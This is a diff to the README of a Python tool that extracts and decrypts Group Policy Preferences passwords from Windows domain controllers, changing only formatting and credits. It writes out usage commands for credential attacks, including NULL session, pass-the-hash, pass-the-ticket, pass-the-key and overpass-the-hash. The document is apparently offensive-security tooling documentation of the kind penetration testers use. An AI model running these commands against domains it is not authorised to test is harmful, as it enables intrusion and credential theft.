@@ -3,28 +3,40 @@
 Python script for extracting and decrypting Group Policy Preferences passwords.
 
 ## Examples
+
 NULL session
+
 ````shell
 python3 Get-GPPPassword.py -no-pass domain_controller
 ````
+
 Username, password
+
 ````shell
 python3 Get-GPPPassword.py domain.local/someuser:somepassword@domain_controller
 ````
+
 Pass-the-hash
+
 ````shell
 python3 Get-GPPPassword.py -hashes [LMhash]:NThash domain.local/someuser@domain_controller
 ````
+
 Pass-the-ticket (partial ptt)
+
 ````shell
 export KRB5CCNAME=someuser.ccache
 python3 Get-GPPPassword.py -k domain_controller
 ````
+
 Pass-the-key
+
 ````shell
 python3 Get-GPPPassword.py -aesKey aesKey domain.local/someuser@domain_controller
 ````
+
 Overpass-the-hash (check that it actually does opth)
+
 ````shell
 python3 Get-GPPPassword.py -k -hashes [LMhash]:NThash domain.local/someuser@domain_controller
 ````
@@ -76,11 +88,11 @@ connection:
 
 # Credits
 
-Thanks to
-- mxrch for the code allowing to read files in stream instead of downloading them
-- the Impacket project for handling the connections, auth, socket parts
-- Microsoft for releasing the AES encryption key for the cpasswords
-- the best, @podalirius_ for coding almost everything that my 5-year-old brain couldn't.
+Thanks to :
+- mxrch for the code allowing to read files in stream instead of downloading them.
+- the Impacket project for handling the connections, auth, socket parts.
+- Microsoft for releasing the AES encryption key for the cpasswords.
+- the best, [@podalirius_](https://twitter.com/@podalirius_) for coding almost everything that my 5-year-old brain couldn't.
 
 # ToDo list
 - add a setup file for installing the script
